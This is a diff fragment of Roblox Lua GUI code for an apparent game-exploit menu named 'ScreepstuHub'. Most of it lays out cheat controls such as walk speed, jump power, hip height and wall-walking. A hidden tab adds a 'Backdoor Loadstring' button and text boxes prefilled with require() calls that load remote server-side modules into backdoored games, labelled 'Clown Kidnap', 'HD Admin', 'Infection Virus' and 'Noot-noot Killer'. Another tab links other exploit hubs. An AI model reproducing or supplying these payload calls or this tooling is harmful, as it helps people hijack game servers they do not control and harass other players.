+ScreepstuHub.HipHeight.BorderSizePixel = 0
+ScreepstuHub.HipHeight.Position = UDim2.new(0, 16, 0, 16)
+ScreepstuHub.HipHeight.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.HipHeight.ZIndex = 2
+ScreepstuHub.HipHeight.Font = Enum.Font.Roboto
+ScreepstuHub.HipHeight.PlaceholderText = "Hip Height: ? (0)"
+ScreepstuHub.HipHeight.Text = ""
+ScreepstuHub.HipHeight.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.HipHeight.TextScaled = true
+ScreepstuHub.HipHeight.TextSize = 14.000
+ScreepstuHub.HipHeight.TextWrapped = true
+
+ScreepstuHub.UIStroke_29.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_29.Color = Color3.fromRGB(111, 111, 111)
+ScreepstuHub.UIStroke_29.Parent = ScreepstuHub.HipHeight
+
+ScreepstuHub.UITextSizeConstraint_37.Parent = ScreepstuHub.HipHeight
+ScreepstuHub.UITextSizeConstraint_37.MaxTextSize = 14
+
+ScreepstuHub.MaxSlopeAngle.Name = "MaxSlopeAngle"
+ScreepstuHub.MaxSlopeAngle.Parent = ScreepstuHub.Container1
+ScreepstuHub.MaxSlopeAngle.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.MaxSlopeAngle.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.MaxSlopeAngle.BorderSizePixel = 0
+ScreepstuHub.MaxSlopeAngle.Position = UDim2.new(0, 16, 0, 16)
+ScreepstuHub.MaxSlopeAngle.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.MaxSlopeAngle.ZIndex = 2
+ScreepstuHub.MaxSlopeAngle.Font = Enum.Font.Roboto
+ScreepstuHub.MaxSlopeAngle.PlaceholderText = "Max Slope Angle: ? (89)"
+ScreepstuHub.MaxSlopeAngle.Text = ""
+ScreepstuHub.MaxSlopeAngle.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.MaxSlopeAngle.TextScaled = true
+ScreepstuHub.MaxSlopeAngle.TextSize = 14.000
+ScreepstuHub.MaxSlopeAngle.TextWrapped = true
+
+ScreepstuHub.UIStroke_30.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_30.Color = Color3.fromRGB(111, 111, 111)
+ScreepstuHub.UIStroke_30.Parent = ScreepstuHub.MaxSlopeAngle
+
+ScreepstuHub.UITextSizeConstraint_38.Parent = ScreepstuHub.MaxSlopeAngle
+ScreepstuHub.UITextSizeConstraint_38.MaxTextSize = 14
+
+ScreepstuHub.WalkSpeed.Name = "WalkSpeed"
+ScreepstuHub.WalkSpeed.Parent = ScreepstuHub.Container1
+ScreepstuHub.WalkSpeed.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.WalkSpeed.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.WalkSpeed.BorderSizePixel = 0
+ScreepstuHub.WalkSpeed.Position = UDim2.new(0, 16, 0, 16)
+ScreepstuHub.WalkSpeed.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.WalkSpeed.ZIndex = 2
+ScreepstuHub.WalkSpeed.Font = Enum.Font.Roboto
+ScreepstuHub.WalkSpeed.PlaceholderText = "Walk Speed: ? (16)"
+ScreepstuHub.WalkSpeed.Text = ""
+ScreepstuHub.WalkSpeed.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.WalkSpeed.TextScaled = true
+ScreepstuHub.WalkSpeed.TextSize = 14.000
+ScreepstuHub.WalkSpeed.TextWrapped = true
+
+ScreepstuHub.UIStroke_31.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_31.Color = Color3.fromRGB(111, 111, 111)
+ScreepstuHub.UIStroke_31.Parent = ScreepstuHub.WalkSpeed
+
+ScreepstuHub.UITextSizeConstraint_39.Parent = ScreepstuHub.WalkSpeed
+ScreepstuHub.UITextSizeConstraint_39.MaxTextSize = 14
+
+ScreepstuHub.JumpPower.Name = "JumpPower"
+ScreepstuHub.JumpPower.Parent = ScreepstuHub.Container1
+ScreepstuHub.JumpPower.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.JumpPower.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.JumpPower.BorderSizePixel = 0
+ScreepstuHub.JumpPower.Position = UDim2.new(0, 16, 0, 16)
+ScreepstuHub.JumpPower.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.JumpPower.ZIndex = 2
+ScreepstuHub.JumpPower.Font = Enum.Font.Roboto
+ScreepstuHub.JumpPower.PlaceholderText = "Jump Power: ? (50)"
+ScreepstuHub.JumpPower.Text = ""
+ScreepstuHub.JumpPower.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.JumpPower.TextScaled = true
+ScreepstuHub.JumpPower.TextSize = 14.000
+ScreepstuHub.JumpPower.TextWrapped = true
+
+ScreepstuHub.UIStroke_32.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_32.Color = Color3.fromRGB(111, 111, 111)
+ScreepstuHub.UIStroke_32.Parent = ScreepstuHub.JumpPower
+
+ScreepstuHub.UITextSizeConstraint_40.Parent = ScreepstuHub.JumpPower
+ScreepstuHub.UITextSizeConstraint_40.MaxTextSize = 14
+
+ScreepstuHub.Sit.Name = "Sit"
+ScreepstuHub.Sit.Parent = ScreepstuHub.Container1
+ScreepstuHub.Sit.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.Sit.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Sit.BorderSizePixel = 0
+ScreepstuHub.Sit.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.Sit.ZIndex = 2
+ScreepstuHub.Sit.Font = Enum.Font.Arial
+ScreepstuHub.Sit.Text = "is Sitting: No"
+ScreepstuHub.Sit.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.Sit.TextScaled = true
+ScreepstuHub.Sit.TextSize = 14.000
+ScreepstuHub.Sit.TextWrapped = true
+
+ScreepstuHub.UIStroke_33.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_33.Color = Color3.fromRGB(38, 255, 156)
+ScreepstuHub.UIStroke_33.Parent = ScreepstuHub.Sit
+
+ScreepstuHub.UITextSizeConstraint_41.Parent = ScreepstuHub.Sit
+ScreepstuHub.UITextSizeConstraint_41.MaxTextSize = 14
+
+ScreepstuHub.Jump.Name = "Jump"
+ScreepstuHub.Jump.Parent = ScreepstuHub.Container1
+ScreepstuHub.Jump.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.Jump.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Jump.BorderSizePixel = 0
+ScreepstuHub.Jump.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.Jump.ZIndex = 2
+ScreepstuHub.Jump.Font = Enum.Font.Arial
+ScreepstuHub.Jump.Text = "Jump"
+ScreepstuHub.Jump.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.Jump.TextScaled = true
+ScreepstuHub.Jump.TextSize = 14.000
+ScreepstuHub.Jump.TextWrapped = true
+
+ScreepstuHub.UIStroke_34.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_34.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_34.Parent = ScreepstuHub.Jump
+
+ScreepstuHub.UITextSizeConstraint_42.Parent = ScreepstuHub.Jump
+ScreepstuHub.UITextSizeConstraint_42.MaxTextSize = 14
+
+ScreepstuHub.ResetCharacter.Name = "ResetCharacter"
+ScreepstuHub.ResetCharacter.Parent = ScreepstuHub.Container1
+ScreepstuHub.ResetCharacter.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.ResetCharacter.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ResetCharacter.BorderSizePixel = 0
+ScreepstuHub.ResetCharacter.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.ResetCharacter.ZIndex = 2
+ScreepstuHub.ResetCharacter.Font = Enum.Font.Arial
+ScreepstuHub.ResetCharacter.Text = "Reset Character"
+ScreepstuHub.ResetCharacter.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.ResetCharacter.TextScaled = true
+ScreepstuHub.ResetCharacter.TextSize = 14.000
+ScreepstuHub.ResetCharacter.TextWrapped = true
+
+ScreepstuHub.UIStroke_35.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_35.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_35.Parent = ScreepstuHub.ResetCharacter
+
+ScreepstuHub.UITextSizeConstraint_43.Parent = ScreepstuHub.ResetCharacter
+ScreepstuHub.UITextSizeConstraint_43.MaxTextSize = 14
+
+ScreepstuHub.Container4.Name = "Container4"
+ScreepstuHub.Container4.Parent = ScreepstuHub.ResetCharacter
+ScreepstuHub.Container4.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.Container4.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Container4.BorderSizePixel = 0
+ScreepstuHub.Container4.Position = UDim2.new(0, 100, 0, 30)
+ScreepstuHub.Container4.Size = UDim2.new(1, -100, 1, -30)
+
+ScreepstuHub.UIGridLayout_3.Parent = ScreepstuHub.Container4
+ScreepstuHub.UIGridLayout_3.SortOrder = Enum.SortOrder.LayoutOrder
+ScreepstuHub.UIGridLayout_3.CellSize = UDim2.new(0, 100, 0, 75)
+
+ScreepstuHub.UIPadding_4.Parent = ScreepstuHub.Container4
+ScreepstuHub.UIPadding_4.PaddingLeft = UDim.new(0, 16)
+ScreepstuHub.UIPadding_4.PaddingTop = UDim.new(0, 16)
+
+ScreepstuHub.UIPadding_5.Parent = ScreepstuHub.Container1
+ScreepstuHub.UIPadding_5.PaddingLeft = UDim.new(0, 16)
+ScreepstuHub.UIPadding_5.PaddingTop = UDim.new(0, 16)
+
+ScreepstuHub.UIGridLayout_4.Parent = ScreepstuHub.Container1
+ScreepstuHub.UIGridLayout_4.SortOrder = Enum.SortOrder.LayoutOrder
+ScreepstuHub.UIGridLayout_4.CellSize = UDim2.new(0, 100, 0, 75)
+
+ScreepstuHub.FieldofView.Name = "FieldofView"
+ScreepstuHub.FieldofView.Parent = ScreepstuHub.Container1
+ScreepstuHub.FieldofView.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.FieldofView.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.FieldofView.BorderSizePixel = 0
+ScreepstuHub.FieldofView.Position = UDim2.new(0, 16, 0, 16)
+ScreepstuHub.FieldofView.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.FieldofView.ZIndex = 2
+ScreepstuHub.FieldofView.Font = Enum.Font.Roboto
+ScreepstuHub.FieldofView.PlaceholderText = "Field of View: ? (70)"
+ScreepstuHub.FieldofView.Text = ""
+ScreepstuHub.FieldofView.TextColor3 = Color3.fromRGB(255, 255, 255)
+ScreepstuHub.FieldofView.TextScaled = true
+ScreepstuHub.FieldofView.TextSize = 14.000
+ScreepstuHub.FieldofView.TextWrapped = true
+
+ScreepstuHub.UIStroke_36.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_36.Color = Color3.fromRGB(111, 111, 111)
+ScreepstuHub.UIStroke_36.Parent = ScreepstuHub.FieldofView
+
+ScreepstuHub.UITextSizeConstraint_44.Parent = ScreepstuHub.FieldofView
+ScreepstuHub.UITextSizeConstraint_44.MaxTextSize = 14
+
+ScreepstuHub.Freeze.Name = "Freeze"
+ScreepstuHub.Freeze.Parent = ScreepstuHub.Container1
+ScreepstuHub.Freeze.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.Freeze.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Freeze.BorderSizePixel = 0
+ScreepstuHub.Freeze.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.Freeze.ZIndex = 2
+ScreepstuHub.Freeze.Font = Enum.Font.Arial
+ScreepstuHub.Freeze.Text = "is Freezing: No"
+ScreepstuHub.Freeze.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.Freeze.TextScaled = true
+ScreepstuHub.Freeze.TextSize = 14.000
+ScreepstuHub.Freeze.TextWrapped = true
+
+ScreepstuHub.UIStroke_37.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_37.Color = Color3.fromRGB(38, 255, 156)
+ScreepstuHub.UIStroke_37.Parent = ScreepstuHub.Freeze
+
+ScreepstuHub.UITextSizeConstraint_45.Parent = ScreepstuHub.Freeze
+ScreepstuHub.UITextSizeConstraint_45.MaxTextSize = 14
+
+ScreepstuHub.Container4_2.Name = "Container4"
+ScreepstuHub.Container4_2.Parent = ScreepstuHub.ScreepstuHub
+ScreepstuHub.Container4_2.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.Container4_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Container4_2.BorderSizePixel = 0
+ScreepstuHub.Container4_2.Position = UDim2.new(0, 100, 0, 30)
+ScreepstuHub.Container4_2.Size = UDim2.new(1, -100, 1, -30)
+ScreepstuHub.Container4_2.Visible = false
+
+ScreepstuHub.UIGridLayout_5.Parent = ScreepstuHub.Container4_2
+ScreepstuHub.UIGridLayout_5.SortOrder = Enum.SortOrder.LayoutOrder
+ScreepstuHub.UIGridLayout_5.CellSize = UDim2.new(0, 100, 0, 75)
+
+ScreepstuHub.UIPadding_6.Parent = ScreepstuHub.Container4_2
+ScreepstuHub.UIPadding_6.PaddingLeft = UDim.new(0, 16)
+ScreepstuHub.UIPadding_6.PaddingTop = UDim.new(0, 16)
+
+ScreepstuHub.BackdoorLoadstring.Name = "BackdoorLoadstring"
+ScreepstuHub.BackdoorLoadstring.Parent = ScreepstuHub.Container4_2
+ScreepstuHub.BackdoorLoadstring.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.BackdoorLoadstring.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.BackdoorLoadstring.BorderSizePixel = 0
+ScreepstuHub.BackdoorLoadstring.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.BackdoorLoadstring.ZIndex = 2
+ScreepstuHub.BackdoorLoadstring.Font = Enum.Font.Arial
+ScreepstuHub.BackdoorLoadstring.Text = "Backdoor Loadstring"
+ScreepstuHub.BackdoorLoadstring.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.BackdoorLoadstring.TextScaled = true
+ScreepstuHub.BackdoorLoadstring.TextSize = 14.000
+ScreepstuHub.BackdoorLoadstring.TextWrapped = true
+
+ScreepstuHub.UIStroke_38.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_38.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_38.Parent = ScreepstuHub.BackdoorLoadstring
+
+ScreepstuHub.UITextSizeConstraint_46.Parent = ScreepstuHub.BackdoorLoadstring
+ScreepstuHub.UITextSizeConstraint_46.MaxTextSize = 14
+
+ScreepstuHub.FrontflipNBackflip.Name = "FrontflipNBackflip"
+ScreepstuHub.FrontflipNBackflip.Parent = ScreepstuHub.Container4_2
+ScreepstuHub.FrontflipNBackflip.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.FrontflipNBackflip.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.FrontflipNBackflip.BorderSizePixel = 0
+ScreepstuHub.FrontflipNBackflip.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.FrontflipNBackflip.ZIndex = 2
+ScreepstuHub.FrontflipNBackflip.Font = Enum.Font.Arial
+ScreepstuHub.FrontflipNBackflip.Text = "Frontflip N Backflip"
+ScreepstuHub.FrontflipNBackflip.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.FrontflipNBackflip.TextScaled = true
+ScreepstuHub.FrontflipNBackflip.TextSize = 14.000
+ScreepstuHub.FrontflipNBackflip.TextWrapped = true
+
+ScreepstuHub.UIStroke_39.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_39.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_39.Parent = ScreepstuHub.FrontflipNBackflip
+
+ScreepstuHub.UITextSizeConstraint_47.Parent = ScreepstuHub.FrontflipNBackflip
+ScreepstuHub.UITextSizeConstraint_47.MaxTextSize = 14
+
+ScreepstuHub.WalkOnWalls.Name = "WalkOnWalls"
+ScreepstuHub.WalkOnWalls.Parent = ScreepstuHub.Container4_2
+ScreepstuHub.WalkOnWalls.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.WalkOnWalls.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.WalkOnWalls.BorderSizePixel = 0
+ScreepstuHub.WalkOnWalls.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.WalkOnWalls.ZIndex = 2
+ScreepstuHub.WalkOnWalls.Font = Enum.Font.Arial
+ScreepstuHub.WalkOnWalls.Text = "Walk on Walls"
+ScreepstuHub.WalkOnWalls.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.WalkOnWalls.TextScaled = true
+ScreepstuHub.WalkOnWalls.TextSize = 14.000
+ScreepstuHub.WalkOnWalls.TextWrapped = true
+
+ScreepstuHub.UIStroke_40.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_40.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_40.Parent = ScreepstuHub.WalkOnWalls
+
+ScreepstuHub.UITextSizeConstraint_48.Parent = ScreepstuHub.WalkOnWalls
+ScreepstuHub.UITextSizeConstraint_48.MaxTextSize = 14
+
+ScreepstuHub.TAS.Name = "TAS"
+ScreepstuHub.TAS.Parent = ScreepstuHub.Container4_2
+ScreepstuHub.TAS.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.TAS.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.TAS.BorderSizePixel = 0
+ScreepstuHub.TAS.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.TAS.ZIndex = 2
+ScreepstuHub.TAS.Font = Enum.Font.Arial
+ScreepstuHub.TAS.Text = "TAS"
+ScreepstuHub.TAS.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.TAS.TextScaled = true
+ScreepstuHub.TAS.TextSize = 14.000
+ScreepstuHub.TAS.TextWrapped = true
+
+ScreepstuHub.UIStroke_41.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_41.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_41.Parent = ScreepstuHub.TAS
+
+ScreepstuHub.UITextSizeConstraint_49.Parent = ScreepstuHub.TAS
+ScreepstuHub.UITextSizeConstraint_49.MaxTextSize = 14
+
+ScreepstuHub.ClownKidnap.Name = "ClownKidnap"
+ScreepstuHub.ClownKidnap.Parent = ScreepstuHub.Container4_2
+ScreepstuHub.ClownKidnap.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.ClownKidnap.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ClownKidnap.BorderSizePixel = 0
+ScreepstuHub.ClownKidnap.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.ClownKidnap.ZIndex = 2
+ScreepstuHub.ClownKidnap.ClearTextOnFocus = false
+ScreepstuHub.ClownKidnap.Font = Enum.Font.Arial
+ScreepstuHub.ClownKidnap.Text = "Clown Kidnap: require(2973851516).load('your username here')"
+ScreepstuHub.ClownKidnap.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.ClownKidnap.TextSize = 14.000
+ScreepstuHub.ClownKidnap.TextWrapped = true
+
+ScreepstuHub.UIStroke_42.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_42.Color = Color3.fromRGB(111, 111, 111)
+ScreepstuHub.UIStroke_42.Parent = ScreepstuHub.ClownKidnap
+
+ScreepstuHub.UITextSizeConstraint_50.Parent = ScreepstuHub.ClownKidnap
+ScreepstuHub.UITextSizeConstraint_50.MaxTextSize = 14
+
+ScreepstuHub.HDAdmin.Name = "HDAdmin"
+ScreepstuHub.HDAdmin.Parent = ScreepstuHub.Container4_2
+ScreepstuHub.HDAdmin.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.HDAdmin.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.HDAdmin.BorderSizePixel = 0
+ScreepstuHub.HDAdmin.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.HDAdmin.ZIndex = 2
+ScreepstuHub.HDAdmin.ClearTextOnFocus = false
+ScreepstuHub.HDAdmin.Font = Enum.Font.Arial
+ScreepstuHub.HDAdmin.Text = "HD Admin: require(7192763922).load('your username here')"
+ScreepstuHub.HDAdmin.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.HDAdmin.TextSize = 14.000
+ScreepstuHub.HDAdmin.TextWrapped = true
+
+ScreepstuHub.UIStroke_43.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_43.Color = Color3.fromRGB(111, 111, 111)
+ScreepstuHub.UIStroke_43.Parent = ScreepstuHub.HDAdmin
+
+ScreepstuHub.UITextSizeConstraint_51.Parent = ScreepstuHub.HDAdmin
+ScreepstuHub.UITextSizeConstraint_51.MaxTextSize = 14
+
+ScreepstuHub.InfectionVirus.Name = "InfectionVirus"
+ScreepstuHub.InfectionVirus.Parent = ScreepstuHub.Container4_2
+ScreepstuHub.InfectionVirus.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.InfectionVirus.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.InfectionVirus.BorderSizePixel = 0
+ScreepstuHub.InfectionVirus.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.InfectionVirus.ZIndex = 2
+ScreepstuHub.InfectionVirus.ClearTextOnFocus = false
+ScreepstuHub.InfectionVirus.Font = Enum.Font.Arial
+ScreepstuHub.InfectionVirus.Text = "Infection Virus: require(9377543709).InfectionV2('your username here')"
+ScreepstuHub.InfectionVirus.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.InfectionVirus.TextSize = 14.000
+ScreepstuHub.InfectionVirus.TextWrapped = true
+
+ScreepstuHub.UIStroke_44.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_44.Color = Color3.fromRGB(111, 111, 111)
+ScreepstuHub.UIStroke_44.Parent = ScreepstuHub.InfectionVirus
+
+ScreepstuHub.NootnootKiller.Name = "NootnootKiller"
+ScreepstuHub.NootnootKiller.Parent = ScreepstuHub.Container4_2
+ScreepstuHub.NootnootKiller.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.NootnootKiller.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.NootnootKiller.BorderSizePixel = 0
+ScreepstuHub.NootnootKiller.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.NootnootKiller.ZIndex = 2
+ScreepstuHub.NootnootKiller.ClearTextOnFocus = false
+ScreepstuHub.NootnootKiller.Font = Enum.Font.Arial
+ScreepstuHub.NootnootKiller.Text = "Noot-noot Killer: require(2113801730).load('your username here')"
+ScreepstuHub.NootnootKiller.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.NootnootKiller.TextSize = 14.000
+ScreepstuHub.NootnootKiller.TextWrapped = true
+
+ScreepstuHub.UIStroke_45.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_45.Color = Color3.fromRGB(111, 111, 111)
+ScreepstuHub.UIStroke_45.Parent = ScreepstuHub.NootnootKiller
+
+ScreepstuHub.UITextSizeConstraint_52.Parent = ScreepstuHub.NootnootKiller
+ScreepstuHub.UITextSizeConstraint_52.MaxTextSize = 14
+
+ScreepstuHub.Container5.Name = "Container5"
+ScreepstuHub.Container5.Parent = ScreepstuHub.ScreepstuHub
+ScreepstuHub.Container5.BackgroundColor3 = Color3.fromRGB(46, 46, 46)
+ScreepstuHub.Container5.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.Container5.BorderSizePixel = 0
+ScreepstuHub.Container5.Position = UDim2.new(0, 100, 0, 30)
+ScreepstuHub.Container5.Size = UDim2.new(1, -100, 1, -30)
+ScreepstuHub.Container5.Visible = false
+
+ScreepstuHub.UIGridLayout_6.Parent = ScreepstuHub.Container5
+ScreepstuHub.UIGridLayout_6.SortOrder = Enum.SortOrder.LayoutOrder
+ScreepstuHub.UIGridLayout_6.CellSize = UDim2.new(0, 100, 0, 75)
+
+ScreepstuHub.UIPadding_7.Parent = ScreepstuHub.Container5
+ScreepstuHub.UIPadding_7.PaddingLeft = UDim.new(0, 16)
+ScreepstuHub.UIPadding_7.PaddingTop = UDim.new(0, 16)
+
+ScreepstuHub.AstraHub.Name = "AstraHub"
+ScreepstuHub.AstraHub.Parent = ScreepstuHub.Container5
+ScreepstuHub.AstraHub.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.AstraHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.AstraHub.BorderSizePixel = 0
+ScreepstuHub.AstraHub.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.AstraHub.ZIndex = 2
+ScreepstuHub.AstraHub.Font = Enum.Font.Arial
+ScreepstuHub.AstraHub.Text = "Astra Hub"
+ScreepstuHub.AstraHub.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.AstraHub.TextScaled = true
+ScreepstuHub.AstraHub.TextSize = 14.000
+ScreepstuHub.AstraHub.TextWrapped = true
+
+ScreepstuHub.UIStroke_46.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_46.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_46.Parent = ScreepstuHub.AstraHub
+
+ScreepstuHub.UITextSizeConstraint_53.Parent = ScreepstuHub.AstraHub
+ScreepstuHub.UITextSizeConstraint_53.MaxTextSize = 14
+
+ScreepstuHub.DemonicHub.Name = "DemonicHub"
+ScreepstuHub.DemonicHub.Parent = ScreepstuHub.Container5
+ScreepstuHub.DemonicHub.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.DemonicHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.DemonicHub.BorderSizePixel = 0
+ScreepstuHub.DemonicHub.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.DemonicHub.ZIndex = 2
+ScreepstuHub.DemonicHub.Font = Enum.Font.Arial
+ScreepstuHub.DemonicHub.Text = "Demonic Hub"
+ScreepstuHub.DemonicHub.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.DemonicHub.TextScaled = true
+ScreepstuHub.DemonicHub.TextSize = 14.000
+ScreepstuHub.DemonicHub.TextWrapped = true
+
+ScreepstuHub.UIStroke_47.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_47.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_47.Parent = ScreepstuHub.DemonicHub
+
+ScreepstuHub.UITextSizeConstraint_54.Parent = ScreepstuHub.DemonicHub
+ScreepstuHub.UITextSizeConstraint_54.MaxTextSize = 14
+
+ScreepstuHub.OwlHub.Name = "OwlHub"
+ScreepstuHub.OwlHub.Parent = ScreepstuHub.Container5
+ScreepstuHub.OwlHub.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.OwlHub.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.OwlHub.BorderSizePixel = 0
+ScreepstuHub.OwlHub.Size = UDim2.new(0, 200, 0, 50)
+ScreepstuHub.OwlHub.ZIndex = 2
+ScreepstuHub.OwlHub.Font = Enum.Font.Arial
+ScreepstuHub.OwlHub.Text = "Owl Hub"
+ScreepstuHub.OwlHub.TextColor3 = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.OwlHub.TextScaled = true
+ScreepstuHub.OwlHub.TextSize = 14.000
+ScreepstuHub.OwlHub.TextWrapped = true
+
+ScreepstuHub.UIStroke_48.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+ScreepstuHub.UIStroke_48.Color = Color3.fromRGB(179, 179, 179)
+ScreepstuHub.UIStroke_48.Parent = ScreepstuHub.OwlHub
+
+ScreepstuHub.UITextSizeConstraint_55.Parent = ScreepstuHub.OwlHub
+ScreepstuHub.UITextSizeConstraint_55.MaxTextSize = 14
+
+ScreepstuHub.ScreepstuHub_2.Name = "ScreepstuHub"
+ScreepstuHub.ScreepstuHub_2.Parent = ScreepstuHub.Container5
+ScreepstuHub.ScreepstuHub_2.BackgroundColor3 = Color3.fromRGB(34, 40, 34)
+ScreepstuHub.ScreepstuHub_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
+ScreepstuHub.ScreepstuHub_2.BorderSizePixel = 0
